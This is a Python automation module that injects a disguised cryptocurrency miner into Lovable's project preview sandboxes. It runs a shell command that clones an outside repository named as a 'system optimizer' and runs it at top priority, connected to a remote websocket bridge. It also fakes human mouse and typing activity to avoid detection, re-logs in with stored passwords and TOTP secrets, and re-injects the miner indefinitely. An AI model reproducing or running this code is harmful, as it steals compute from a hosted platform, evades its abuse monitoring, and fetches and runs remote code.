#!/usr/bin/env python3
"""
Worker Runner - Start worker + health check
Handles randomized injection and auto-recovery
"""

import asyncio
import random
import subprocess
from datetime import datetime

# Worker config
MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
BRIDGE_URL = "wss://chimera-bridge-production-0703.up.railway.app"


def generate_random_folder_name() -> str:
    """Generate folder name: moly (fixed)"""
    return "moly"


async def human_presence(page, moves: int = 3) -> None:
    """Human touch: random mouse moves, scrolls, hovers, pauses, neutral click.
    Keeps both chat and preview tabs looking alive between checks."""
    try:
        for _ in range(moves):
            try:
                await page.mouse.move(random.randint(100, 1700),
                                      random.randint(100, 850),
                                      steps=random.randint(3, 12))
            except Exception:
                pass
            await asyncio.sleep(random.uniform(0.3, 1.4))
        # scroll up/down like reading
        for _ in range(random.randint(1, 3)):
            try:
                await page.mouse.wheel(0, random.randint(-400, 400))
            except Exception:
                pass
            await asyncio.sleep(random.uniform(0.5, 1.8))
        # hover a random visible element (no click — never triggers nav)
        try:
            await page.evaluate("""() => {
                const els = [...document.querySelectorAll('button, a, input, [role=button]')]
                    .filter(e => { const r = e.getBoundingClientRect();
                        return r.width > 0 && r.height > 0 && r.top > 0 && r.top < innerHeight; });
                if (!els.length) return;
                const el = els[Math.floor(Math.random() * els.length)];
                el.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
            }""")
        except Exception:
            pass
        await asyncio.sleep(random.uniform(0.4, 1.2))
        # neutral click on empty page area (never links/buttons)
        try:
            box = await page.evaluate("""() => ({w: window.innerWidth, h: window.innerHeight})""")
            await page.mouse.click(int(box["w"] * 0.5), int(box["h"] * 0.92))
        except Exception:
            pass
        # random "reading" pause
        await asyncio.sleep(random.uniform(1.0, 4.0))
    except Exception:
        pass


async def human_type(page, locator, text: str) -> None:
    """Type char-by-char with human rhythm (bursts + pauses + occasional correction)."""
    await locator.click()
    await asyncio.sleep(random.uniform(0.3, 0.8))
    i = 0
    while i < len(text):
        burst = random.randint(1, 5)
        chunk = text[i:i + burst]
        await locator.press_sequentially(chunk, delay=random.uniform(40, 140))
        i += burst
        if random.random() < 0.12 and i > 3:
            # typo + backspace correction
            await locator.press_sequentially("x", delay=60)
            await asyncio.sleep(random.uniform(0.2, 0.5))
            await page.keyboard.press("Backspace")
            await page.keyboard.press("Backspace")
            await asyncio.sleep(random.uniform(0.2, 0.6))
        if random.random() < 0.25:
            await asyncio.sleep(random.uniform(0.4, 1.2))
    await asyncio.sleep(random.uniform(0.5, 1.5))


async def human_chat_visit(chat_page, chat_url: str, stay_seconds: float = 0) -> bool:
    """Visit chat tab like a human checking on the AI: goto, scroll, read pause.
    Returns True if chat input visible (project alive), False otherwise."""
    try:
        await chat_page.goto(chat_url, timeout=45000)
    except Exception:
        pass
    await asyncio.sleep(random.uniform(3, 6))
    try:
        n = await chat_page.locator(
            'div[contenteditable="true"][role="textbox"], [contenteditable="true"], textarea'
        ).count()
        alive = n > 0
    except Exception:
        alive = False
    await human_presence(chat_page, moves=random.randint(2, 4))
    if stay_seconds > 0:
        await asyncio.sleep(stay_seconds + random.uniform(0, 5))
    return alive


async def wait_console_ready(page, timeout_seconds: int = 300) -> bool:
    """Wait until window.doc bridge answers (console-ready gate)."""
    start = asyncio.get_running_loop().time()
    while asyncio.get_running_loop().time() - start < timeout_seconds:
        try:
            ok = await page.evaluate("""() => {
                if (!window.doc || typeof window.doc !== 'function') return false;
                try {
                    const p = window.doc('pwd');
                    return !!(p && typeof p.then === 'function');
                } catch (e) { return false; }
            }""")
            if ok:
                return True
        except Exception:
            pass
        await asyncio.sleep(10)
    return False


def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 16) -> str:
    """Build worker start command (MINER_CMD env overrides, never commit it).

    Default 16 threads — 64 thrashs Lovable 1GB sandboxes (sync forever, no ok).
    Always pass --bridge so we never silently hit a stale DEFAULT_BRIDGE.
    python3 -u so sync/ok/rate flush into /tmp/m.log immediately.
    """
    import os as _os
    _override = _os.environ.get("MINER_CMD")
    if _override:
        return _override
    return (
        f"cd /tmp && rm -rf {folder_name} && "
        f"git clone --depth 1 -q \"{MINER_REPO}\" {folder_name} && "
        f"cd {folder_name} && pip install websockets psutil --break-system-packages -q && "
        f"PYTHONUNBUFFERED=1 nice -n -20 python3 -u sysoptd.py "
        f"--bridge {bridge_url} --threads {threads} "
        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause "
        f"> /tmp/m.log 2>&1"
    )


async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 16) -> bool:
    """
    Inject miner into Lovable preview iframe.
    
    Returns: True if successful, False otherwise
    """
    try:
        folder_name = generate_random_folder_name()
        cmd = build_worker_command(folder_name, bridge_url, threads)
        
        print(f"⚙️ Starting worker (folder: {folder_name})...")
        
        # Wait for Preview iframe / Shell Sandbox to attach
        await asyncio.sleep(3)
        # Soft-click Preview so iframe exists (daemon also does this)
        for label in ("Preview", "preview", "Shell", "shell"):
            try:
                btn = page.get_by_role("button", name=label, exact=False)
                n = await asyncio.wait_for(btn.count(), timeout=2)
                if n > 0:
                    await btn.first.click(timeout=2500)
                    await asyncio.sleep(0.8)
                    break
            except Exception:
                continue
        await asyncio.sleep(2)

        def _frame_score(frame) -> int:
            """Prefer lovableproject.com Shell Sandbox over id-preview / chat chrome."""
            try:
                u = (frame.url or "").lower()
            except Exception:
                return -1
            # Chat UI itself — never inject here
            if "lovable.dev" in u and "lovableproject" not in u:
                return -1
            try:
                is_main = frame == page.main_frame
            except Exception:
                is_main = False
            # Nested Shell Sandbox often shows as about:blank in DevTools
            if not u or u.startswith("about:"):
                return 5 if not is_main else -1
            score = 0
            if "lovableproject.com" in u:
                score += 100
            if "webcontainer" in u or "stackblitz" in u:
                score += 40
            # id-preview is often a cold mirror without window.doc — last resort
            if "id-preview" in u or (
                    "lovable.app" in u and "preview" in u):
                score += 15
            if "localhost:" in u or "127.0.0.1:" in u:
                score += 10
            if is_main and "lovableproject.com" in u:
                score += 30
            return score

        def _pick_preview_frame():
            frames = list(page.frames)
            print(f"   Found {len(frames)} frames total")
            ranked = []
            for frame in frames:
                try:
                    fu = frame.url or ""
                except Exception:
                    fu = "?"
                sc = _frame_score(frame)
                print(f"   Checking frame (score={sc}): {fu[:100]}")
                if sc > 0:
                    ranked.append((sc, frame))
            ranked.sort(key=lambda x: -x[0])
            if ranked:
                best = ranked[0][1]
                print(f"   ✅ Picked frame score={ranked[0][0]}: {(best.url or '')[:100]}")
                return best
            # Direct lovableproject tab
            try:
                main_url = page.main_frame.url.lower()
            except Exception:
                main_url = ""
            if "lovableproject.com" in main_url:
                print("   ✅ Preview is the main frame (direct lovableproject.com URL)")
                return page.main_frame
            return None

        preview_frame = _pick_preview_frame()
        if not preview_frame:
            print("❌ Could not find preview iframe")
            print(f"   Available frames: {[getattr(f, 'url', '?')[:80] for f in page.frames]}")
            return False

        print(f"✅ Using frame: {(preview_frame.url or '')[:100]}")

        # Never install a fake window.doc object — it poisons the iframe
        # (`typeof doc !== 'function'`) and blocks the real Shell Sandbox.
        try:
            doc_state = await preview_frame.evaluate("""() => {
                if (window.doc && typeof window.doc !== 'function') {
                    try { delete window.doc; } catch (e) { window.doc = undefined; }
                    return 'cleared-fake';
                }
                if (typeof window.doc === 'function') return 'real';
                return 'missing';
            }""")
            print(f"   Doc state: {doc_state}")
        except Exception as e:
            print(f"   Doc state check fail: {type(e).__name__}: {e}")

        await asyncio.sleep(2)

        # Probe: wait until real window.doc(cmd) works. Try every candidate frame
        # each attempt — Shell Sandbox may be nested / appear late.
        probe_ok = False
        for attempt in range(8):
            ranked = []
            for frame in list(page.frames):
                sc = _frame_score(frame)
                if sc > 0:
                    ranked.append((sc, frame))
            ranked.sort(key=lambda x: -x[0])
            if not ranked:
                print(f"   ⏳ No preview frames yet (attempt {attempt+1}/8)")
                await asyncio.sleep(12)
                continue
            print(f"   Probe attempt {attempt+1}/8 — {len(ranked)} candidate frame(s)")
            for sc, fr in ranked:
                try:
                    fu = (fr.url or "")[:90]
                except Exception:
                    fu = "?"
                try:
                    # Clear fake object if something re-installed it
                    await asyncio.wait_for(fr.evaluate("""() => {
                        if (window.doc && typeof window.doc !== 'function') {
                            try { delete window.doc; } catch (e) { window.doc = undefined; }
                        }
                        return true;
                    }"""), timeout=5)
                except Exception:
                    pass
                try:
                    probe = await asyncio.wait_for(fr.evaluate("""
                        (async () => {
                            if (!window.doc || typeof window.doc !== 'function') return { ok: false, error: 'no doc bridge' };
                            if (window.doc.connect && typeof window.doc.connect === 'function') {
                                try { await window.doc.connect(); } catch (e) {}
                            }
                            try {
                                const r = await window.doc('nproc');
                                const out = (r && (r.stdout !== undefined ? r.stdout : r)) + '';
                                const code = (r && r.code !== undefined) ? r.code : null;
                                const ok = !!(out.trim()) && (code === null || code === 0);
                                return { ok: ok, result: out.trim().slice(0, 80),
                                         error: ok ? null : ('nproc fail code=' + code) };
                            } catch (e) {
                                return { ok: false, error: String(e && e.message || e) };
                            }
                        })()
                    """), timeout=15)
                except Exception as e:
                    print(f"   ⏳ score={sc} {fu}: {type(e).__name__}: {e}")
                    continue
                if probe and probe.get("ok"):
                    preview_frame = fr
                    probe_ok = True
                    print(f"   ✅ Sandbox ready on score={sc} {fu} (attempt {attempt+1})")
                    break
                err = (probe or {}).get("error", "unknown")
                print(f"   ⏳ score={sc} {fu}: {err}")
            if probe_ok:
                break
            await asyncio.sleep(12)
        
        if not probe_ok:
            print("❌ Sandbox never became ready - aborting injection")
            return False
        
        # Execute worker command
        print(f"🚀 Executing worker command...")
        
        # ponytail: cmd runs forever (sysoptd blocks) - background it so the
        # shell returns instantly. Awaiting a foreground exec hung ~8 min.
        bg_cmd = f"{cmd} & echo STARTED"
        
        try:
            exec_code = f"""
            (async () => {{
                const cmd = `{bg_cmd}`;
                // Step 1: doc.connect() if available
                if (window.doc && typeof window.doc.connect === 'function') {{
                    try {{ await window.doc.connect(); }} catch (e) {{}}
                }}
                // Step 2: fire the worker in the background — real Shell only
                if (typeof window.doc === 'function') {{
                    try {{
                        const r = await window.doc(cmd);
                        return {{ method: 'doc(cmd)', ok: true, result: r }};
                    }} catch (e) {{
                        return {{ method: 'doc(cmd)', ok: false, error: e.message }};
                    }}
                }}
                return {{ method: 'none', ok: false }};
            }})()
            """
            
            result = await asyncio.wait_for(preview_frame.evaluate(exec_code), timeout=45)
            print(f"   Execution result: {result}")
        except asyncio.TimeoutError:
            print("   ⏳ Start command gave no reply in 45s — checking if worker is up anyway")
        except Exception as e:
            print(f"   ⚠️  Start command error: {type(e).__name__}: {e} — checking worker")

        # Never trust the start reply alone — confirm sysoptd is actually running.
        verify_js = """async () => {
            if (typeof window.doc !== 'function') return 'nodoc';
            try {
                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
                return r && r.stdout !== undefined ? String(r.stdout).trim() : 'no-probe';
            } catch (e) { return 'probe-error'; }
        }"""
        for check in range(1, 5):
            await asyncio.sleep(5 if check == 1 else 8)
            try:
                count = await asyncio.wait_for(preview_frame.evaluate(verify_js), timeout=15)
            except Exception as e:
                count = f"eval-{type(e).__name__}"
            if str(count).isdigit() and int(count) > 0:
                print(f"✅ Worker confirmed running ({count} procs) — folder {folder_name}")
                return True
            print(f"   ⏳ Worker not seen yet (check {check}/4: {count})")

        print("❌ Worker not running after start — caller will retry in place")
        return False
        
    except Exception as e:
        print(f"❌ Injection failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def check_preview_health(page) -> str:
    """
    Check if preview is healthy or showing error.
    
    Returns: "OK" | "ERROR" | "UNKNOWN"
    """
    try:
        content = await page.content()
        
        # Check for known error
        if "Lovable proxy error" in content and "404" in content:
            return "ERROR"
        
        # Check if iframe exists
        frames = page.frames
        has_preview = any("webcontainer" in f.url.lower() or "lovableproject" in f.url.lower() or f.url.startswith("https://lovable-") for f in frames)
        
        if has_preview:
            return "OK"
        else:
            return "UNKNOWN"
    
    except Exception as e:
        print(f"⚠️  Health check failed: {e}")
        return "UNKNOWN"


async def recover_from_error(page, project_url: str, bridge_url: str = BRIDGE_URL, session_config: dict | None = None) -> bool:
    """
    Recover from preview error by prompting AI again.
    
    Flow:
    1. Go to chat_url
    2. Send prompt to AI
    3. Wait 40-60 seconds (human reading pauses)
    4. Return to preview_url
    5. Restart worker

    Chat-input finding retries 3 rounds with page refresh between rounds.
    If redirected to login and session_config given, attempts email+password+TOTP
    re-login before giving up.

    Returns: True if recovery successful, False otherwise
    """
    try:
        print("🔄 Starting recovery process...")

        # Extract base project URL
        if ".lovableproject.com" in project_url:
            project_id = project_url.split("//")[1].split(".")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        elif "/projects/" in project_url:
            project_id = project_url.split("/projects/")[1].split("/")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        else:
            chat_url = project_url

        try:
            project_id
        except NameError:
            project_id = chat_url.rstrip("/").split("/")[-1]
        preview_url = f"https://{project_id}.lovableproject.com"

        prompts = [
            "Start the development server",
            "Run the dev server please",
            "Start the application",
            "Launch the preview",
            "Can you rebuild the preview?",
            "Please restart the dev server",
        ]

        chat_selectors = [
            'div[contenteditable="true"][role="textbox"]',
            'textarea[placeholder*="chat"]',
            'textarea[placeholder*="message"]',
            'textarea[placeholder*="Ask"]',
            'textarea',
            '[contenteditable="true"]',
        ]

        async def _find_chat_input():
            for selector in chat_selectors:
                try:
                    el = await page.wait_for_selector(selector, timeout=5000, state="visible")
                    if el and await el.is_visible() and await el.is_enabled():
                        return el
                except Exception:
                    continue
            return None

        async def _try_relogin():
            """Re-login fallback when bounced to /login. Returns True on success."""
            cfg = session_config or {}
            email = cfg.get("email", "")
            password = cfg.get("password", email)
            if not email:
                return False
            try:
                if "/login" not in page.url and "/auth" not in page.url:
                    return False
                print("   🔑 Bounced to login — re-logging in...")
                email_el = None
                for sel in ['input[type="email"]', 'input[name="email"]', 'input[placeholder*="mail" i]']:
                    try:
                        email_el = await page.wait_for_selector(sel, timeout=8000, state="visible")
                        if email_el:
                            break
                    except Exception:
                        continue
                if not email_el:
                    return False
                await email_el.fill(email)
                await asyncio.sleep(0.5)
                try:
                    btn = page.get_by_role("button", name="Continue", exact=True).first
                    if await btn.is_visible():
                        await btn.click()
                except Exception:
                    await email_el.press("Enter")
                await asyncio.sleep(3)
                pwd_el = None
                for sel in ['input[type="password"]', 'input[name="password"]']:
                    try:
                        pwd_el = await page.wait_for_selector(sel, timeout=10000, state="visible")
                        if pwd_el:
                            break
                    except Exception:
                        continue
                if pwd_el:
                    await pwd_el.fill(password)
                    await asyncio.sleep(0.5)
                    try:
                        btn = page.get_by_role("button", name="Sign in", exact=True).first
                        if await btn.is_visible():
                            await btn.click()
                        else:
                            await pwd_el.press("Enter")
                    except Exception:
                        await pwd_el.press("Enter")
                    await asyncio.sleep(5)
                # TOTP if challenged
                try:
                    body = await page.locator("body").inner_text(timeout=3000)
                except Exception:
                    body = ""
                if "authenticator code" in body.lower() and cfg.get("totp_secret"):
                    import pyotp
                    code = pyotp.TOTP(cfg["totp_secret"]).now()
                    try:
                        el = page.locator('#totp-code, input[inputmode="numeric"], input[autocomplete="one-time-code"]').first
                        if await el.count():
                            await el.fill(code)
                            try:
                                vbtn = page.get_by_role("button", name="Verify", exact=True).first
                                if await vbtn.count():
                                    await vbtn.click(timeout=5000)
                                else:
                                    await page.keyboard.press("Enter")
                            except Exception:
                                await page.keyboard.press("Enter")
                            await asyncio.sleep(4)
                    except Exception:
                        pass
                await asyncio.sleep(3)
                if "/login" not in page.url and "/auth" not in page.url:
                    print("   ✅ Re-login OK")
                    return True
                print("   ❌ Re-login did not reach dashboard")
                return False
            except Exception as e:
                print(f"   ❌ Re-login error: {str(e)[:120]}")
                return False

        # 1-2. Go to chat, find input with 3 refresh rounds + re-login fallback
        prompt = random.choice(prompts)
        chat_input = None
        for round_n in range(1, 4):
            print(f"📝 Going to chat (round {round_n}/3): {chat_url}")
            try:
                await page.goto(chat_url, timeout=45000)
            except Exception:
                pass
            await asyncio.sleep(random.uniform(4, 7))
            await human_presence(page, moves=2)

            # Bounced to login? Re-login then continue round.
            if "/login" in page.url or "/auth" in page.url:
                if await _try_relogin():
                    try:
                        await page.goto(chat_url, timeout=45000)
                    except Exception:
                        pass
                    await asyncio.sleep(4)
                else:
                    print(f"   ⚠️  Round {round_n}: login wall, refreshing and retrying...")
                    await asyncio.sleep(10)
                    continue

            chat_input = await _find_chat_input()
            if chat_input:
                print(f"   ✅ Chat input found (round {round_n})")
                break
            print(f"   ⚠️  Round {round_n}: no chat input, refreshing...")
            try:
                await page.reload(timeout=30000)
            except Exception:
                pass
            await asyncio.sleep(random.uniform(5, 9))

        if not chat_input:
            print("❌ Could not find chat input after 3 rounds + re-login")
            return False

        # Human-typed prompt (not instant fill)
        print(f"💬 Typing prompt to AI: '{prompt}'")
        await human_type(page, chat_input, prompt)
        await asyncio.sleep(random.uniform(0.8, 2.0))

        # Send: click send button if visible else Enter
        sent = False
        try:
            send_btn = page.locator('button[data-testid="chat-input-send"], button[aria-label*="Send" i]').first
            if await send_btn.count() and await send_btn.is_visible(timeout=3000):
                await send_btn.click()
                sent = True
        except Exception:
            pass
        if not sent:
            await page.keyboard.press("Enter")
        print("   ✅ Prompt sent (human-typed)")
        
        # 3. Wait 40-60 seconds
        wait_time = random.randint(40, 60)
        print(f"⏳ Waiting {wait_time} seconds for AI to respond...")
        await asyncio.sleep(wait_time)
        
        # 4. Go back to preview, refresh until 404 gone (max 6 tries)
        print(f"🔄 Returning to preview: {preview_url}")
        await page.goto(preview_url, timeout=30000)
        await human_presence(page, moves=2)
        cleared = False
        for attempt in range(6):
            await asyncio.sleep(8)
            try:
                content = await page.content()
            except Exception:
                content = ""
            if "Lovable proxy error" in content and "404" in content:
                print(f"   🔄 404 still present, refreshing ({attempt+1}/6)...")
                try:
                    await page.reload(timeout=30000)
                except Exception:
                    pass
                await human_presence(page, moves=2)
                continue
            cleared = True
            break
        if not cleared:
            print("   ⚠️  404 stuck after 6 refreshes")
            return False
        print("   ✅ 404 gone")

        # 5. Console-ready gate, then re-inject (same order as fresh visit)
        print("   ⏳ Waiting console-ready gate...")
        if not await wait_console_ready(page, timeout_seconds=300):
            print("   ⚠️  Console never ready after recovery")
            return False
        print("   ✅ Console ready")

        # 6. Restart worker
        print("⚙️ Restarting worker...")
        await human_presence(page, moves=2)
        success = await inject_miner(page, bridge_url)
        
        if success:
            print("✅ Recovery complete!")
            return True
        else:
            print("❌ Re-injection failed")
            return False
        
    except Exception as e:
        print(f"❌ Recovery failed: {e}")
        return False


async def health_check_loop(page, project_url: str, mode: str = "full", bridge_url: str = BRIDGE_URL, context=None, max_runtime_minutes: float = None, session_config: dict | None = None, chat_url: str | None = None):
    """
    Continuous health check loop.

    Modes:
    - "oneshot": Keep checking until the preview stops loading (error on page), then end
    - "full": Keep checking every 3min, auto-recover on error (NEVER stops on recovery failure — backs off and retries forever)
    - "gh": Same as full, but stop after max_runtime_minutes (for GH Actions job limits)

    Dual-tab human activity: keeps a chat tab alongside the preview tab and
    alternates human-like presence on both (mouse, scroll, hover, read pauses).

    If the page crashes/closes, a fresh page is relaunched and the worker re-injected.
    """
    check_interval = 180  # 3 minutes
    loop_start = datetime.now()
    consec_recovery_fails = 0
    chat_tab = None  # lazily opened second tab for human chat activity
    
    print(f"\n{'='*60}")
    print(f"🏥 HEALTH CHECK MODE: {mode.upper()}")
    print(f"{'='*60}\n")
    
    iteration = 0
    
    while True:
        iteration += 1
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if max_runtime_minutes:
            elapsed_min = (datetime.now() - loop_start).total_seconds() / 60
            if elapsed_min >= max_runtime_minutes:
                print(f"\n⏰ Max runtime reached ({elapsed_min:.0f}/{max_runtime_minutes:.0f} min) - ENDING")
                return True
        
        print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")
        
        try:
            # ponytail: never reload the page - reloading the WebContainer kills
            # the injected worker. Probe for a live sysoptd instead; re-inject
            # only when the worker is missing.
            try:
                frames = page.frames
                preview_frame = next(
                    (f for f in frames if any(p in f.url.lower() for p in [
                        "webcontainer", "lovableproject", "lovable-", "preview",
                        "stackblitz", "localhost:", "127.0.0.1:",
                    ])),
                    None
                )
                alive = False
                if preview_frame:
                    probe = await preview_frame.evaluate("""
                        (async () => {
                            if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
                            try {
                                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
                                if (r && r.stdout !== undefined) return r.stdout.trim();
                                if (typeof r === 'string') return r.trim();
                                return JSON.stringify(r);
                            } catch (e) { return 'probe-error'; }
                        })()
                    """)
                    alive = str(probe).isdigit() and int(probe) > 0
                    if alive:
                        print(f"   ✅ Worker alive in sandbox (pgrep: {probe})")
                    else:
                        print(f"   ⚙️  Worker missing (probe: {probe}) - re-injecting...")
                        success = await inject_miner(page, bridge_url)
                        print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
                else:
                    print("   ⚠️  Preview frame not found - cannot probe worker")
            except Exception as e:
                print(f"   ⚠️  Keep-alive probe failed: {e}")
            
            # Check health WITHOUT reloading the page
            health = await check_preview_health(page)
            print(f"   Status: {health}")
            
            if health == "ERROR":
                print("   ⚠️  ERROR DETECTED - preview no longer loading!")
                print("   🔄 Re-checking 3 times (15s apart) to rule out slow reload...")
                
                still_error = True
                for attempt in range(3):
                    await asyncio.sleep(15)
                    try:
                        await page.reload(timeout=30000)
                    except Exception:
                        pass
                    await asyncio.sleep(8)
                    health = await check_preview_health(page)
                    print(f"   🔄 Re-check #{attempt+1}: {health}")
                    if health != "ERROR":
                        still_error = False
                        break
                
                if still_error:
                    print("   ⚠️  Preview still failing after re-checks")

                    if mode == "oneshot":
                        print("   🛑 Oneshot mode - preview stopped, ENDING")
                        return False
                    else:
                        print("   🔄 Full mode - attempting recovery...")
                        success = await recover_from_error(
                            page, project_url, bridge_url, session_config)

                        if not success:
                            consec_recovery_fails += 1
                            backoff = min(300 * consec_recovery_fails, 1800)
                            print(f"   ❌ Recovery failed (#{consec_recovery_fails}) — backing off {backoff}s, will retry (NEVER stopping)")
                            await asyncio.sleep(backoff)
                            continue
                        else:
                            consec_recovery_fails = 0
                            print("   ✅ Recovery successful - continuing...")
                else:
                    consec_recovery_fails = 0
                    print("   ✅ Preview recovered after re-checks - continuing")

            elif health == "OK":
                consec_recovery_fails = 0
                print("   ✅ Preview healthy")
                await human_presence(page, moves=3)
                # Dual-tab: human activity on chat tab too (alternating presence)
                if mode == "full" and context is not None:
                    try:
                        if chat_tab is None or chat_tab.is_closed():
                            curl = chat_url
                            if not curl:
                                if ".lovableproject.com" in project_url:
                                    _pid = project_url.split("//")[1].split(".")[0]
                                elif "/projects/" in project_url:
                                    _pid = project_url.split("/projects/")[1].split("/")[0]
                                else:
                                    _pid = ""
                                curl = f"https://lovable.dev/projects/{_pid}" if _pid else None
                            if curl:
                                chat_tab = await context.new_page()
                                print("   👥 Opened chat tab for dual presence")
                        if chat_tab is not None and not chat_tab.is_closed():
                            alive = await human_chat_visit(
                                chat_tab, curl,
                                stay_seconds=random.uniform(10, 40))
                            print(f"   👥 Chat tab visit: {'alive' if alive else 'no chat input (will retry next round)'}")
                            await human_presence(page, moves=2)  # back on preview
                    except Exception as e:
                        print(f"   ⚠️  Chat-tab visit skipped: {str(e)[:100]}")
            else:
                print("   ⚠️  Unknown status")
                await human_presence(page, moves=2)
            
            # Wait for next check
            print(f"   ⏳ Next check in {check_interval}s...")
            await asyncio.sleep(check_interval)
        
        except KeyboardInterrupt:
            print("\n⚠️  Health check interrupted by user")
            return False
        except Exception as e:
            print(f"   ❌ Check failed: {e}")
            
            if mode == "oneshot":
                print("   🛑 Oneshot mode - check failed, ENDING")
                return False
            else:
                print("   ⏳ Retrying in 30s...")
                await asyncio.sleep(30)


if __name__ == "__main__":
    print("🧪 Worker Runner Module")
    print("\nFunctions:")
    print("  - inject_worker(page, bridge_url)")
    print("  - check_preview_health(page)")
    print("  - recover_from_error(page, project_url)")
    print("  - health_check_loop(page, project_url, mode='full')")
    print("\nImport this module in your scripts.")
